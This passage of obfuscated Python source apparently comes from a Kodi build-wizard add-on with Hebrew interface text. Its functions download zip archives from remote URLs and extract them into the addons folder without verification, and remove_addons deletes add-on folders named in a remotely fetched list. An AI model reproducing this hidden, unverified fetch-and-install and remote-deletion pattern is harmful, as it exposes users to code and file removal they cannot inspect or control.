						OO0O0OOO0O000OOO0 =int (OO0O0OOO0O000OOO0 );O0O0OOOO0O0OOOOOO =int (O0O0OOOO0O0OOOOOO )#line:5164
						checkidupdate ()#line:5165
						wiz .setS ("notedismiss","true")#line:5166
						if OO0O0OOO0O000OOO0 ==O0O0OOOO0O0OOOOOO :#line:5167
							wiz .log ("[Notifications] id[%s] Dismissed"%int (OO0O0OOO0O000OOO0 ),xbmc .LOGNOTICE )#line:5168
						elif OO0O0OOO0O000OOO0 >O0O0OOOO0O0OOOOOO :#line:5170
							wiz .log ("[Notifications] id: %s"%str (OO0O0OOO0O000OOO0 ),xbmc .LOGNOTICE )#line:5171
							wiz .setS ('noteid',str (OO0O0OOO0O000OOO0 ))#line:5172
							wiz .setS ("notedismiss","true")#line:5173
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5176
					except Exception as OO00O0000OO00O000 :#line:5177
						wiz .log ("Error on Notifications Window: %s"%str (OO00O0000OO00O000 ),xbmc .LOGERROR )#line:5178
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5180
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OO000O000O0O0000O ),xbmc .LOGNOTICE )#line:5181
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5182
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5183
def checkidupdate ():#line:5189
				wiz .setS ("notedismiss","true")#line:5191
				O0OO00O000000O00O =wiz .workingURL (NOTIFICATION )#line:5192
				O000OO00O0OO000O0 =" Kodi Premium"#line:5194
				O000O00OO0O00O0O0 =wiz .checkBuild (O000OO00O0OO000O0 ,'gui')#line:5195
				O0OOOOO0000OO0OO0 =O000OO00O0OO000O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5196
				if not wiz .workingURL (O000O00OO0O00O0O0 )==True :return #line:5197
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5198
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O000OO00O0OO000O0 ),'','אנא המתן')#line:5199
				O0000OO0OOO00O00O =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OOOOO0000OO0OO0 )#line:5200
				try :os .remove (O0000OO0OOO00O00O )#line:5201
				except :pass #line:5202
				logging .warning (O000O00OO0O00O0O0 )#line:5203
				if 'google'in O000O00OO0O00O0O0 :#line:5204
				   OOOO0OO00OOOOO0OO =googledrive_download (O000O00OO0O00O0O0 ,O0000OO0OOO00O00O ,DP ,wiz .checkBuild (O000OO00O0OO000O0 ,'filesize'))#line:5205
				else :#line:5208
				  downloader .download (O000O00OO0O00O0O0 ,O0000OO0OOO00O00O ,DP )#line:5209
				xbmc .sleep (100 )#line:5210
				OO0O0OO000000O0O0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000OO00O0OO000O0 )#line:5211
				DP .update (0 ,OO0O0OO000000O0O0 ,'','אנא המתן')#line:5212
				extract .all (O0000OO0OOO00O00O ,HOME ,DP ,title =OO0O0OO000000O0O0 )#line:5213
				DP .close ()#line:5214
				wiz .defaultSkin ()#line:5215
				wiz .lookandFeelData ('save')#line:5216
				if KODIV >=18 :#line:5217
					skindialogsettind18 ()#line:5218
				if INSTALLMETHOD ==1 :OO0OOO0000OOOOO00 =1 #line:5221
				elif INSTALLMETHOD ==2 :OO0OOO0000OOOOO00 =0 #line:5222
				else :DP .close ()#line:5223
def gaiaserenaddon ():#line:5225
  OOOO0OOO0O0O00OO0 =(ADDON .getSetting ("gaiaseren"))#line:5226
  O00OO0OOOOOOOO000 =(ADDON .getSetting ("auto_rd"))#line:5227
  if OOOO0OOO0O0O00OO0 =='true'and O00OO0OOOOOOOO000 =='true':#line:5228
    O00OO000O000O0OO0 =(NEWFASTUPDATE )#line:5229
    OOOOOO0O00O0O00OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5230
    OOOOOOO00O00O00O0 =xbmcgui .DialogProgress ()#line:5231
    OOOOOOO00O00O00O0 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5232
    O0000OO0OOOO00OO0 =os .path .join (PACKAGES ,'isr.zip')#line:5233
    O0OO00O0OO0O000O0 =urllib2 .Request (O00OO000O000O0OO0 )#line:5234
    OO0OOOOO0O0OO000O =urllib2 .urlopen (O0OO00O0OO0O000O0 )#line:5235
    OO000OOO0OO0OOOO0 =xbmcgui .DialogProgress ()#line:5237
    OO000OOO0OO0OOOO0 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5238
    OO000OOO0OO0OOOO0 .update (0 )#line:5239
    O0O0OO00OOO00OO0O =open (O0000OO0OOOO00OO0 ,'wb')#line:5241
    try :#line:5243
      OO00OO0O0OO0O000O =OO0OOOOO0O0OO000O .info ().getheader ('Content-Length').strip ()#line:5244
      OOOO00OO00O0O0OOO =True #line:5245
    except AttributeError :#line:5246
          OOOO00OO00O0O0OOO =False #line:5247
    if OOOO00OO00O0O0OOO :#line:5249
          OO00OO0O0OO0O000O =int (OO00OO0O0OO0O000O )#line:5250
    OOOOOOO0OOO0OOOOO =0 #line:5252
    O0OOOOOO00O000O0O =time .time ()#line:5253
    while True :#line:5254
          O00O0OO0OO0O0O000 =OO0OOOOO0O0OO000O .read (8192 )#line:5255
          if not O00O0OO0OO0O0O000 :#line:5256
              sys .stdout .write ('\n')#line:5257
              break #line:5258
          OOOOOOO0OOO0OOOOO +=len (O00O0OO0OO0O0O000 )#line:5260
          O0O0OO00OOO00OO0O .write (O00O0OO0OO0O0O000 )#line:5261
          if not OOOO00OO00O0O0OOO :#line:5263
              OO00OO0O0OO0O000O =OOOOOOO0OOO0OOOOO #line:5264
          if OO000OOO0OO0OOOO0 .iscanceled ():#line:5265
             OO000OOO0OO0OOOO0 .close ()#line:5266
             try :#line:5267
              os .remove (O0000OO0OOOO00OO0 )#line:5268
             except :#line:5269
              pass #line:5270
             break #line:5271
          OOO00OOOO00O0O0OO =float (OOOOOOO0OOO0OOOOO )/OO00OO0O0OO0O000O #line:5272
          OOO00OOOO00O0O0OO =round (OOO00OOOO00O0O0OO *100 ,2 )#line:5273
          OO0000OOO00O0000O =OOOOOOO0OOO0OOOOO /(1024 *1024 )#line:5274
          OO0O000O0O0OOO00O =OO00OO0O0OO0O000O /(1024 *1024 )#line:5275
          O0000O000O0000O0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0000OOO00O0000O ,'teal',OO0O000O0O0OOO00O )#line:5276
          if (time .time ()-O0OOOOOO00O000O0O )>0 :#line:5277
            O00OOO000O0O00OO0 =OOOOOOO0OOO0OOOOO /(time .time ()-O0OOOOOO00O000O0O )#line:5278
            O00OOO000O0O00OO0 =O00OOO000O0O00OO0 /1024 #line:5279
          else :#line:5280
           O00OOO000O0O00OO0 =0 #line:5281
          O00O00OO0000OO0OO ='KB'#line:5282
          if O00OOO000O0O00OO0 >=1024 :#line:5283
             O00OOO000O0O00OO0 =O00OOO000O0O00OO0 /1024 #line:5284
             O00O00OO0000OO0OO ='MB'#line:5285
          if O00OOO000O0O00OO0 >0 and not OOO00OOOO00O0O0OO ==100 :#line:5286
              OOO000OOO0OO0O0O0 =(OO00OO0O0OO0O000O -OOOOOOO0OOO0OOOOO )/O00OOO000O0O00OO0 #line:5287
          else :#line:5288
              OOO000OOO0OO0O0O0 =0 #line:5289
          O0O000O000O0OOO0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00OOO000O0O00OO0 ,O00O00OO0000OO0OO )#line:5290
          OO000OOO0OO0OOOO0 .update (int (OOO00OOOO00O0O0OO ),O0000O000O0000O0O ,O0O000O000O0OOO0O +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5292
    O00OOO0OOO00O0OO0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5295
    O0O0OO00OOO00OO0O .close ()#line:5298
    extract .all (O0000OO0OOOO00OO0 ,O00OOO0OOO00O0OO0 ,OO000OOO0OO0OOOO0 )#line:5299
    try :#line:5303
      os .remove (O0000OO0OOOO00OO0 )#line:5304
    except :#line:5305
      pass #line:5306
def iptvsimpldownpc ():#line:5307
    O00OO0OOO0OO00O00 =(IPTVSIMPL18PC )#line:5309
    OOOO000O000OOOO00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5310
    OOOOOOOOOOO0OOO00 =xbmcgui .DialogProgress ()#line:5311
    OOOOOOOOOOO0OOO00 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5312
    O00000O0OO0OO00O0 =os .path .join (PACKAGES ,'isr.zip')#line:5313
    O0OO00000OO0O00OO =urllib2 .Request (O00OO0OOO0OO00O00 )#line:5314
    OOO0O0O00OOO00OO0 =urllib2 .urlopen (O0OO00000OO0O00OO )#line:5315
    OOOOO0O0O00OO00O0 =xbmcgui .DialogProgress ()#line:5317
    OOOOO0O0O00OO00O0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5318
    OOOOO0O0O00OO00O0 .update (0 )#line:5319
    O0O000O0O000OOO00 =open (O00000O0OO0OO00O0 ,'wb')#line:5321
    try :#line:5323
      O00OOO00O00O0OO0O =OOO0O0O00OOO00OO0 .info ().getheader ('Content-Length').strip ()#line:5324
      OO000000O0000O0OO =True #line:5325
    except AttributeError :#line:5326
          OO000000O0000O0OO =False #line:5327
    if OO000000O0000O0OO :#line:5329
          O00OOO00O00O0OO0O =int (O00OOO00O00O0OO0O )#line:5330
    OO000OO00OOO00O00 =0 #line:5332
    O0OOO000OO00OOOOO =time .time ()#line:5333
    while True :#line:5334
          OO000000O000000O0 =OOO0O0O00OOO00OO0 .read (8192 )#line:5335
          if not OO000000O000000O0 :#line:5336
              sys .stdout .write ('\n')#line:5337
              break #line:5338
          OO000OO00OOO00O00 +=len (OO000000O000000O0 )#line:5340
          O0O000O0O000OOO00 .write (OO000000O000000O0 )#line:5341
          if not OO000000O0000O0OO :#line:5343
              O00OOO00O00O0OO0O =OO000OO00OOO00O00 #line:5344
          if OOOOO0O0O00OO00O0 .iscanceled ():#line:5345
             OOOOO0O0O00OO00O0 .close ()#line:5346
             try :#line:5347
              os .remove (O00000O0OO0OO00O0 )#line:5348
             except :#line:5349
              pass #line:5350
             break #line:5351
          O00000O0O0O00OO0O =float (OO000OO00OOO00O00 )/O00OOO00O00O0OO0O #line:5352
          O00000O0O0O00OO0O =round (O00000O0O0O00OO0O *100 ,2 )#line:5353
          OO00OOO0OOOO0O000 =OO000OO00OOO00O00 /(1024 *1024 )#line:5354
          O0OOOO00O0O00O000 =O00OOO00O00O0OO0O /(1024 *1024 )#line:5355
          O00O0O00O0O00OO0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO00OOO0OOOO0O000 ,'teal',O0OOOO00O0O00O000 )#line:5356
          if (time .time ()-O0OOO000OO00OOOOO )>0 :#line:5357
            OOOO0OOO00O0OOOOO =OO000OO00OOO00O00 /(time .time ()-O0OOO000OO00OOOOO )#line:5358
            OOOO0OOO00O0OOOOO =OOOO0OOO00O0OOOOO /1024 #line:5359
          else :#line:5360
           OOOO0OOO00O0OOOOO =0 #line:5361
          OOO0OO0O00OOO0OOO ='KB'#line:5362
          if OOOO0OOO00O0OOOOO >=1024 :#line:5363
             OOOO0OOO00O0OOOOO =OOOO0OOO00O0OOOOO /1024 #line:5364
             OOO0OO0O00OOO0OOO ='MB'#line:5365
          if OOOO0OOO00O0OOOOO >0 and not O00000O0O0O00OO0O ==100 :#line:5366
              O0OO000O000OO0O00 =(O00OOO00O00O0OO0O -OO000OO00OOO00O00 )/OOOO0OOO00O0OOOOO #line:5367
          else :#line:5368
              O0OO000O000OO0O00 =0 #line:5369
          O00O00O0O0O0O0O0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOO0OOO00O0OOOOO ,OOO0OO0O00OOO0OOO )#line:5370
          OOOOO0O0O00OO00O0 .update (int (O00000O0O0O00OO0O ),O00O0O00O0O00OO0O ,O00O00O0O0O0O0O0O +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5372
    OOO0OOO0O0OOOOO0O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5375
    O0O000O0O000OOO00 .close ()#line:5378
    extract .all (O00000O0OO0OO00O0 ,OOO0OOO0O0OOOOO0O ,OOOOO0O0O00OO00O0 )#line:5379
    try :#line:5383
      os .remove (O00000O0OO0OO00O0 )#line:5384
    except :#line:5385
      pass #line:5386
def iptvsimpldown ():#line:5387
    OO0000O0OO00O00OO =(IPTV18 )#line:5389
    O00O0000OO0OO0000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5390
    O00O00O0O0O0OO00O =xbmcgui .DialogProgress ()#line:5391
    O00O00O0O0O0OO00O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5392
    OOOOOOO000O000O00 =os .path .join (PACKAGES ,'isr.zip')#line:5393
    OO000OOOOOO0O0OOO =urllib2 .Request (OO0000O0OO00O00OO )#line:5394
    O00OO0O0OOO0OOO00 =urllib2 .urlopen (OO000OOOOOO0O0OOO )#line:5395
    O00O0OOO0000OO0O0 =xbmcgui .DialogProgress ()#line:5397
    O00O0OOO0000OO0O0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5398
    O00O0OOO0000OO0O0 .update (0 )#line:5399
    OOO0O0OO000OO000O =open (OOOOOOO000O000O00 ,'wb')#line:5401
    try :#line:5403
      OOOO0O00O0O000000 =O00OO0O0OOO0OOO00 .info ().getheader ('Content-Length').strip ()#line:5404
      OO0OO0OO0OO0O000O =True #line:5405
    except AttributeError :#line:5406
          OO0OO0OO0OO0O000O =False #line:5407
    if OO0OO0OO0OO0O000O :#line:5409
          OOOO0O00O0O000000 =int (OOOO0O00O0O000000 )#line:5410
    OO00O000OOOO0O0O0 =0 #line:5412
    O0O000OOO0O0O0000 =time .time ()#line:5413
    while True :#line:5414
          O0OOOO0OOO00000O0 =O00OO0O0OOO0OOO00 .read (8192 )#line:5415
          if not O0OOOO0OOO00000O0 :#line:5416
              sys .stdout .write ('\n')#line:5417
              break #line:5418
          OO00O000OOOO0O0O0 +=len (O0OOOO0OOO00000O0 )#line:5420
          OOO0O0OO000OO000O .write (O0OOOO0OOO00000O0 )#line:5421
          if not OO0OO0OO0OO0O000O :#line:5423
              OOOO0O00O0O000000 =OO00O000OOOO0O0O0 #line:5424
          if O00O0OOO0000OO0O0 .iscanceled ():#line:5425
             O00O0OOO0000OO0O0 .close ()#line:5426
             try :#line:5427
              os .remove (OOOOOOO000O000O00 )#line:5428
             except :#line:5429
              pass #line:5430
             break #line:5431
          OO000OOOO00OO000O =float (OO00O000OOOO0O0O0 )/OOOO0O00O0O000000 #line:5432
          OO000OOOO00OO000O =round (OO000OOOO00OO000O *100 ,2 )#line:5433
          O0O0O0000O0O0O0OO =OO00O000OOOO0O0O0 /(1024 *1024 )#line:5434
          OO000OOO0000OOOOO =OOOO0O00O0O000000 /(1024 *1024 )#line:5435
          OOOO0O00OOO00OO0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0O0O0000O0O0O0OO ,'teal',OO000OOO0000OOOOO )#line:5436
          if (time .time ()-O0O000OOO0O0O0000 )>0 :#line:5437
            OOO0O0OO0O00OOOO0 =OO00O000OOOO0O0O0 /(time .time ()-O0O000OOO0O0O0000 )#line:5438
            OOO0O0OO0O00OOOO0 =OOO0O0OO0O00OOOO0 /1024 #line:5439
          else :#line:5440
           OOO0O0OO0O00OOOO0 =0 #line:5441
          OOOOO0OOO00OO00OO ='KB'#line:5442
          if OOO0O0OO0O00OOOO0 >=1024 :#line:5443
             OOO0O0OO0O00OOOO0 =OOO0O0OO0O00OOOO0 /1024 #line:5444
             OOOOO0OOO00OO00OO ='MB'#line:5445
          if OOO0O0OO0O00OOOO0 >0 and not OO000OOOO00OO000O ==100 :#line:5446
              OO000O0OOOOOO000O =(OOOO0O00O0O000000 -OO00O000OOOO0O0O0 )/OOO0O0OO0O00OOOO0 #line:5447
          else :#line:5448
              OO000O0OOOOOO000O =0 #line:5449
          OO0OOOOOO0O0O0O00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO0O0OO0O00OOOO0 ,OOOOO0OOO00OO00OO )#line:5450
          O00O0OOO0000OO0O0 .update (int (OO000OOOO00OO000O ),OOOO0O00OOO00OO0O ,OO0OOOOOO0O0O0O00 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5452
    O00OO00OO00O00OOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5455
    OOO0O0OO000OO000O .close ()#line:5458
    extract .all (OOOOOOO000O000O00 ,O00OO00OO00O00OOO ,O00O0OOO0000OO0O0 )#line:5459
    try :#line:5463
      os .remove (OOOOOOO000O000O00 )#line:5464
    except :#line:5465
      pass #line:5466
def testnotify ():#line:5467
	O00O00OO00O0O00O0 =wiz .workingURL (NOTIFICATION )#line:5468
	if O00O00OO00O0O00O0 ==True :#line:5469
		try :#line:5470
			OOOO0O00OOOO00000 ,OOOO0O0OOO00OO0O0 =wiz .splitNotify (NOTIFICATION )#line:5471
			if OOOO0O00OOOO00000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5472
			if STARTP2 ()=='ok':#line:5473
				notify .notification (OOOO0O0OOO00OO0O0 ,True )#line:5474
		except Exception as O00O000OO00O0OO00 :#line:5475
			wiz .log ("Error on Notifications Window: %s"%str (O00O000OO00O0OO00 ),xbmc .LOGERROR )#line:5476
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5477
def testnotify2 ():#line:5478
	O00OOO00O00OO000O =wiz .workingURL (NOTIFICATION2 )#line:5479
	if O00OOO00O00OO000O ==True :#line:5480
		try :#line:5481
			OOO0O00OOOOOOOO00 ,OOO00O0O0O00O00O0 =wiz .splitNotify (NOTIFICATION2 )#line:5482
			if OOO0O00OOOOOOOO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5483
			if STARTP2 ()=='ok':#line:5484
				notify .notification2 (OOO00O0O0O00O00O0 ,True )#line:5485
		except Exception as OO0O0OOOO0O00OOO0 :#line:5486
			wiz .log ("Error on Notifications Window: %s"%str (OO0O0OOOO0O00OOO0 ),xbmc .LOGERROR )#line:5487
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5488
def testnotify3 ():#line:5489
	O0OO000000O0000O0 =wiz .workingURL (NOTIFICATION3 )#line:5490
	if O0OO000000O0000O0 ==True :#line:5491
		try :#line:5492
			OO0OO0OOOOOOO0OOO ,O0OOOO0OO0OOOOO00 =wiz .splitNotify (NOTIFICATION3 )#line:5493
			if OO0OO0OOOOOOO0OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5494
			if STARTP2 ()=='ok':#line:5495
				notify .notification3 (O0OOOO0OO0OOOOO00 ,True )#line:5496
		except Exception as OO0O00O0O00000OOO :#line:5497
			wiz .log ("Error on Notifications Window: %s"%str (OO0O00O0O00000OOO ),xbmc .LOGERROR )#line:5498
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5499
def wait ():#line:5500
 wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אנא המתן[/COLOR]"%COLOR2 )#line:5501
def infobuild ():#line:5502
	OOOO00O00OOOO000O =wiz .workingURL (NOTIFICATION )#line:5503
	if OOOO00O00OOOO000O ==True :#line:5504
		try :#line:5505
			OO0OOOOOOO0OOO000 ,O0O0OO0000O0O0OO0 =wiz .splitNotify (NOTIFICATION )#line:5506
			if OO0OOOOOOO0OOO000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5507
			if STARTP2 ()=='ok':#line:5508
				notify .updateinfo (O0O0OO0000O0O0OO0 ,True )#line:5509
		except Exception as OOO0OO00000000OO0 :#line:5510
			wiz .log ("Error on Notifications Window: %s"%str (OOO0OO00000000OO0 ),xbmc .LOGERROR )#line:5511
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5512
def servicemanual ():#line:5513
	O00000000OOOO00OO =wiz .workingURL (HELPINFO )#line:5514
	if O00000000OOOO00OO ==True :#line:5515
		try :#line:5516
			OO000O0OOO00O0O00 ,OO0O0000OO000OO0O =wiz .splitNotify (HELPINFO )#line:5517
			if OO000O0OOO00O0O00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5518
			notify .helpinfo (OO0O0000OO000OO0O ,True )#line:5519
		except Exception as O0O0OO000OO0OO00O :#line:5520
			wiz .log ("Error on Notifications Window: %s"%str (O0O0OO000OO0OO00O ),xbmc .LOGERROR )#line:5521
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5522
def testupdate ():#line:5524
	if BUILDNAME =="":#line:5525
		notify .updateWindow ()#line:5526
	else :#line:5527
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5528
def testfirst ():#line:5530
	notify .firstRun ()#line:5531
def testfirstRun ():#line:5533
	notify .firstRunSettings ()#line:5534
def fastinstall ():#line:5537
	notify .firstRuninstall ()#line:5538
def addDir (OOO0OO00OOO0OOOOO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5545
	O000OO0O00O0OOO0O =sys .argv [0 ]#line:5546
	if not mode ==None :O000OO0O00O0OOO0O +="?mode=%s"%urllib .quote_plus (mode )#line:5547
	if not name ==None :O000OO0O00O0OOO0O +="&name="+urllib .quote_plus (name )#line:5548
	if not url ==None :O000OO0O00O0OOO0O +="&url="+urllib .quote_plus (url )#line:5549
	O0OOOO0OO00OOO000 =True #line:5550
	if themeit :OOO0OO00OOO0OOOOO =themeit %OOO0OO00OOO0OOOOO #line:5551
	OOOOO0O00O000OOO0 =xbmcgui .ListItem (OOO0OO00OOO0OOOOO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5552
	OOOOO0O00O000OOO0 .setInfo (type ="Video",infoLabels ={"Title":OOO0OO00OOO0OOOOO ,"Plot":description })#line:5553
	OOOOO0O00O000OOO0 .setProperty ("Fanart_Image",fanart )#line:5554
	if not menu ==None :OOOOO0O00O000OOO0 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5555
	O0OOOO0OO00OOO000 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O000OO0O00O0OOO0O ,listitem =OOOOO0O00O000OOO0 ,isFolder =True )#line:5556
	return O0OOOO0OO00OOO000 #line:5557
def addFile (OO00OOOOO000OO000 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5559
	O000OOO0000OOOO00 =sys .argv [0 ]#line:5560
	if not mode ==None :O000OOO0000OOOO00 +="?mode=%s"%urllib .quote_plus (mode )#line:5561
	if not name ==None :O000OOO0000OOOO00 +="&name="+urllib .quote_plus (name )#line:5562
	if not url ==None :O000OOO0000OOOO00 +="&url="+urllib .quote_plus (url )#line:5563
	O0OOOOOO0O000O00O =True #line:5564
	if themeit :OO00OOOOO000OO000 =themeit %OO00OOOOO000OO000 #line:5565
	O0O000OOOOO0OO00O =xbmcgui .ListItem (OO00OOOOO000OO000 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5566
	O0O000OOOOO0OO00O .setInfo (type ="Video",infoLabels ={"Title":OO00OOOOO000OO000 ,"Plot":description })#line:5567
	O0O000OOOOO0OO00O .setProperty ("Fanart_Image",fanart )#line:5568
	if not menu ==None :O0O000OOOOO0OO00O .addContextMenuItems (menu ,replaceItems =overwrite )#line:5569
	O0OOOOOO0O000O00O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O000OOO0000OOOO00 ,listitem =O0O000OOOOO0OO00O ,isFolder =False )#line:5570
	return O0OOOOOO0O000O00O #line:5571
def get_params ():#line:5573
	OO000O0O00OO0OO00 =[]#line:5574
	OOOO00O0OOO0OO0OO =sys .argv [2 ]#line:5575
	if len (OOOO00O0OOO0OO0OO )>=2 :#line:5576
		O00OO0O00O0OOOOOO =sys .argv [2 ]#line:5577
		OOOO00OOOOO0OO0O0 =O00OO0O00O0OOOOOO .replace ('?','')#line:5578
		if (O00OO0O00O0OOOOOO [len (O00OO0O00O0OOOOOO )-1 ]=='/'):#line:5579
			O00OO0O00O0OOOOOO =O00OO0O00O0OOOOOO [0 :len (O00OO0O00O0OOOOOO )-2 ]#line:5580
		OOO0O00O0OO0O0O0O =OOOO00OOOOO0OO0O0 .split ('&')#line:5581
		OO000O0O00OO0OO00 ={}#line:5582
		for O0O0OOOO000O0O0O0 in range (len (OOO0O00O0OO0O0O0O )):#line:5583
			O0OOO0O0O0OOO0OO0 ={}#line:5584
			O0OOO0O0O0OOO0OO0 =OOO0O00O0OO0O0O0O [O0O0OOOO000O0O0O0 ].split ('=')#line:5585
			if (len (O0OOO0O0O0OOO0OO0 ))==2 :#line:5586
				OO000O0O00OO0OO00 [O0OOO0O0O0OOO0OO0 [0 ]]=O0OOO0O0O0OOO0OO0 [1 ]#line:5587
		return OO000O0O00OO0OO00 #line:5589
def remove_addons ():#line:5591
	try :#line:5592
			import json #line:5593
			O0O00O000000000OO =urllib2 .urlopen (remove_url ).readlines ()#line:5594
			for O0O000OO00O00O0O0 in O0O00O000000000OO :#line:5595
				O0000OO00O0OO0000 =O0O000OO00O00O0O0 .split (':')[1 ].strip ()#line:5597
				OOOO00OO00O0O00O0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O0000OO00O0OO0000 ,'false')#line:5598
				O0OOOOO00OO000OO0 =xbmc .executeJSONRPC (OOOO00OO00O0O00O0 )#line:5599
				OOOO00OO00O00OOO0 =json .loads (O0OOOOO00OO000OO0 )#line:5600
				OO0O0O0000000000O =os .path .join (addons_folder ,O0000OO00O0OO0000 )#line:5602
				if os .path .exists (OO0O0O0000000000O ):#line:5604
					for OO0O000O0O000000O ,O0OOOO00OO000OO0O ,O00O0000OO000OOOO in os .walk (OO0O0O0000000000O ):#line:5605
						for O0O00O00OOO0OOOOO in O00O0000OO000OOOO :#line:5606
							os .unlink (os .path .join (OO0O000O0O000000O ,O0O00O00OOO0OOOOO ))#line:5607
						for O0OO00O000OO000OO in O0OOOO00OO000OO0O :#line:5608
							shutil .rmtree (os .path .join (OO0O000O0O000000O ,O0OO00O000OO000OO ))#line:5609
					os .rmdir (OO0O0O0000000000O )#line:5610
			xbmc .executebuiltin ('Container.Refresh')#line:5612
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5613
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5614
	except :pass #line:5615
def remove_addons2 ():#line:5616
	try :#line:5617
			import json #line:5618
			OO0OO00OO0OOO0O00 =urllib2 .urlopen (remove_url2 ).readlines ()#line:5619
			for O0000000000O0OOOO in OO0OO00OO0OOO0O00 :#line:5620
				O00O0OOO0O0000O0O =O0000000000O0OOOO .split (':')[1 ].strip ()#line:5622
